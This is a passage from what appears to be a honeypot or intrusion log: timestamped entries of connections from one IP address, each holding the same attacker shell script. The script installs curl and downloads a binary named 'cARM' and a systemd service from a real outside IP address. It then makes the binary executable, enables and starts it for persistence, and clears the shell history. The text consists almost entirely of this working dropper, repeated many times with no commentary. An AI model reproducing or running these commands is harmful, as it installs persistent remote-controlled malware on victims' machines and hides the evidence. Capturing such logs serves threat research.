		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:26.473260 - ('45.148.10.203', 54008) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:30.779699 - ('45.148.10.203', 39186) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:34.396283 - ('45.148.10.203', 39218) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:38.309154 - ('45.148.10.203', 39242) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:42.807466 - ('45.148.10.203', 36988) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:47.408973 - ('45.148.10.203', 36990) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:51.571522 - ('45.148.10.203', 40600) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:54.938250 - ('45.148.10.203', 40616) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:28:59.308073 - ('45.148.10.203', 54852) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:29:02.803133 - ('45.148.10.203', 54856) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
